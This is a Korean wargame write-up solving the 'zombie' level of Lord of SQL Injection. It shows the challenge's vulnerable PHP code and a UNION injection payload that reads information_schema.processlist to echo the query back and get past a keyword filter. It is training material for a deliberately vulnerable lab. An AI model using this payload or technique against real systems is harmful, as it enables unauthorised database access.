---
title: "[Lord of SQL Injection] LoS - zombie 문제풀이"
date: 2018-09-18
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

핳핳 드디어 거의 끝이 보인다!
이번 문제는 `zombie`이다.

<!--more-->

코드는 다음과 같다.  

```php
-------------------------------------------------------------------
query : select pw from prob_zombie where pw=''
-------------------------------------------------------------------

<?php
  include "./config.php";
  login_chk();
  dbconnect("zombie");
  if(preg_match('/rollup|join|ace|@/i', $_GET['pw'])) exit("No Hack ~_~");
  $query = "select pw from prob_zombie where pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['pw']) echo "<h2>Pw : {$result[pw]}</h2>";
  if(($result['pw']) && ($result['pw'] === $_GET['pw'])) solve("zombie");
  highlight_file(__FILE__);
?>
```

처음엔 이 문제 보고 `이 전 문제 푼거랑 똑같이 풀면 되겠다!` 생각했다.
근데 `ace`에 필터링이 있어서 `replace`를 사용을 못하더라.
그래서 어떻게 풀지... 고민하는데 내 옆에 있던 `웹짱해커`님이 `ㅎㅎ 겁나 쉽게 풀 수 있는데~~` 이러고 약올렸다. ㅂㄷㅂㄷ

화나는 건 이렇게 약올리는데 난 방법을 모르겠는거다!
어쨌든 어찌어찌 풀긴 했는데, `information_schema`의 테이블 이름을 다 외우고 있어야되나 싶은 생각이 들었다.
`information_schema` 데이터베이스를 보면 `processlist`라는 테이블이 있다.
이 테이블에는 현재 실행중인 쿼리문이 저장되어 있다.
실제 내 서버에서 확인해 본 결과이다.  

```bash
mysql> select * from processlist;
+----+------+-----------+--------------------+---------+------+-----------+---------------------------+
| ID | USER | HOST      | DB                 | COMMAND | TIME | STATE     | INFO                      |
+----+------+-----------+--------------------+---------+------+-----------+---------------------------+
| 24 | root | localhost | information_schema | Query   |    0 | executing | select * from processlist |
+----+------+-----------+--------------------+---------+------+-----------+---------------------------+
1 row in set (0.00 sec)
```

`INFO` 컬럼에 내가 방금 입력 한 `select * from processlist`가 있는 것을 알 수 있다.
그렇다면 내가 문제를 풀기위해 입력하는 쿼리도 이 `processlist`에 들어가 있을테니, 그 `processlist`에서 데이터를 추출 해 내가 입력 한 부분만 잘라내면 그 결과가 똑같이 나오게 될 것이다.  

```plain
?pw=' union select substr(info, 38, 72) from information_schema.processlist#
```

위와 같이 넘겨준다면, `processlist`의 `info` 컬럼에 `select pw from prob_zombie where pw='' union select substr(info, 38, 72) from information_schema.processlist#` 가 저장되어 있을 것이다.
이 때, `substr(info, 38, 72)`를 `select`하도록 해, 내가 입력 한 `' union select substr(info, 38, 72) from information_schema.processlist#`를 뽑아 오도록 하면 된다.
힣 `zombie`도 처치했다!  

```php
----------------------------------------------------------------------------------------------------------------------------------------------------------------
query : select pw from prob_zombie where pw='' union select substr(info, 38, 72) from information_schema.processlist#'
----------------------------------------------------------------------------------------------------------------------------------------------------------------

Pw : ' union select substr(info, 38, 72) from information_schema.processlist#
ZOMBIE Clear!
<?php
  include "./config.php";
  login_chk();
  dbconnect("zombie");
  if(preg_match('/rollup|join|ace|@/i', $_GET['pw'])) exit("No Hack ~_~");
  $query = "select pw from prob_zombie where pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['pw']) echo "<h2>Pw : {$result[pw]}</h2>";
  if(($result['pw']) && ($result['pw'] === $_GET['pw'])) solve("zombie");
  highlight_file(__FILE__);
?>
```

---

```plain
ZOMBIE Clear!!
```